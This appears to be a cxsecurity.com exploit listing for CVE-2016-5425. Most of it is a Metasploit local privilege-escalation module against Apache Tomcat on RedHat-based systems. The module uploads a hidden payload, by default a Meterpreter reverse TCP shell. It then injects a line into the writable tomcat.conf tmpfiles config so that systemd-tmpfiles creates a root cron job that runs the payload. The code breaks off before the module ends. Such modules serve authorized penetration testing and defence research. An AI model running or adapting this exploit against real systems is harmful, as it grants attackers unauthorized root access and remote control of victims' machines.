---
title: Apache Tomcat Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023030036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-15
fetch_date: 2025-10-04T09:33:07.248630
---

# Apache Tomcat Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache Tomcat Privilege Escalation** **2023.03.14**  Credit:  **[h00die](https://cxsecurity.com/author/h00die/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2016-5425](https://cxsecurity.com/cveshow/CVE-2016-5425/ "Click to see CVE-2016-5425")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")**  CVSS Base Score: **7.2/10**  Impact Subscore: **10/10**  Exploitability Subscore: **3.9/10**  Exploit range: **Local**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Complete**  Integrity impact: **Complete**  Availability impact: **Complete** | |

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in a command on a linux computer for priv esc.
#
###
class MetasploitModule < Msf::Exploit::Local
Rank = ManualRanking
include Msf::Exploit::Retry
include Msf::Post::Linux::Priv
include Msf::Post::Linux::System
include Msf::Post::File
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
include Msf::Post::Linux::Compile
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation',
'Description' => %q{
This module exploits a vulnerability in RedHat based systems where
improper file permissions are applied to /usr/lib/tmpfiles.d/tomcat.conf
for Apache Tomcat versions before 7.0.54-8. This may also work against
The configuration files in tmpfiles.d are used by systemd-tmpfiles to manage
temporary files including their creation.
With this weak permission, we're able to inject commands into systemd-tmpfiles
service to write a cron job to execute our payload.
systemd-tmpfiles is executed by default on boot on RedHat-based systems
through systemd-tmpfiles-setup.service. Depending on the system in use,
the execution of systemd-tmpfiles could also be triggered by other
services, cronjobs, startup scripts etc.
This module was tested against Tomcat 7.0.54-3 on Fedora 21.
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die', # msf module
'Dawid Golunski <dawid@legalhackers.com>' # original PoC, analysis, discovery
],
'Platform' => [ 'linux' ],
'Arch' => [ ARCH\_X86, ARCH\_X64 ],
'SessionTypes' => [ 'shell', 'meterpreter' ],
'Targets' => [[ 'Auto', {} ]],
'Privileged' => true,
'DefaultOptions' => {
'WfsDelay' => 1800, # 30min
'payload' => 'linux/x64/meterpreter\_reverse\_tcp'
},
'References' => [
['EDB', '40488' ],
['URL', 'https://access.redhat.com/security/cve/CVE-2016-5425'],
['URL', 'http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html'],
['URL', 'https://www.freedesktop.org/software/systemd/man/tmpfiles.d.html'], # general tompfiles.d info
['CVE', '2016-5425']
],
'DisclosureDate' => '2016-10-10',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [ARTIFACTS\_ON\_DISK, CONFIG\_CHANGES, IOC\_IN\_LOGS]
}
)
)
register\_advanced\_options [
OptString.new('WritableDir', [ true, 'A directory where we can write and execute files', '/tmp' ]),
]
end
# Simplify pulling the writable directory variable
def base\_dir
datastore['WritableDir'].to\_s
end
def tomcat\_conf
'/usr/lib/tmpfiles.d/tomcat.conf'
end
def suid?(file)
get\_suid\_files(file).include? file
end
def check
package = cmd\_exec('rpm -qa | grep "^tomcat\-[678]"')
if package.nil? || package.empty?
return CheckCode::Safe('Unable to execute command to determine installed pacakges')
end
package = package.sub('tomcat-', '').strip
# fedora based cleanup
package = package.sub(/\.fc\d\d\.noarch/, '')
# rhel/centos based cleanup
package = package.sub(/\.el\d\_\d\.noarch/, '')
package = Rex::Version.new(package)
# The write-up says 6, 7, 8 but doesn't include version numbers. RHEL's writeup says
# only 7 is effected, so we're going to go off their write-up.
if package.to\_s.start\_with?('7') && package < Rex::Version.new('7.0.54-8')
return CheckCode::Appears("Vulnerable app version detected: #{package}")
end
CheckCode::Safe("Unexploitable tomcat packages found: #{package}")
end
def exploit
# Check if we're already root
if is\_root? && !datastore['ForceExploit']
fail\_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
end
unless writable? base\_dir
fail\_with Failure::BadConfig, "#{base\_dir} is not writable"
end
unless writable? tomcat\_conf
fail\_with Failure::BadConfig, "#{tomcat\_conf} is not writable"
end
vprint\_status("Creating backup of #{tomcat\_conf}")
@tomcat\_conf\_content = read\_file(tomcat\_conf)
path = store\_loot(
tomcat\_conf,
'text/plain',
rhost,
@tomcat\_conf\_content,
'tomcat.conf'
)
print\_good("Original #{tomcat\_conf} backed up to #{path}")
# Upload payload executable
payload\_path = "#{base\_dir}/.#{rand\_text\_alphanumeric(5..10)}"
vprint\_status("Uploading Payload to #{payload\_path}")
upload\_and\_chmodx payload\_path, generate\_payload\_exe
register\_file\_for\_cleanup(payload\_path)
# write in our payload execution
vprint\_status("Writing permission elevation into #{tomcat\_conf}")
cron\_job = "/etc/cron.d/#{rand\_text\_alphanumeric(5..10)}"
print\_status("Creating cron job in #{cron\_job}")
# The POC shows 2 options, a cron answer, and copy bash answer.
# Initially I attempted to copy our payload, set suid and root owner
# however it seemed to need 2 service restart to apply all the permissions.
# I never figured out why it was like that, even chaining copying bash in, then
# launching the payload from the bash instance etc. We opt for the cron
# which may take 1 additional minute, and rely on cron, but is much more stable
cmd\_exec("echo 'F #{cron\_job} 0644 root root - \"\* \* \* \* \* root nohup #{payload\_path} & \\n\\n\"' >> #{tomcat\_conf}")
register\_file\_for\_cleanup(cron\_job)
# we now need systemd-tmpfiles to restart
print\_good("Waiting #{datastore['WfsDelay']} seconds. Run the following command on the target machine: /usr/bin/systemd-tmpfiles --create - this is required to restart the tmpfiles-setup.service")
...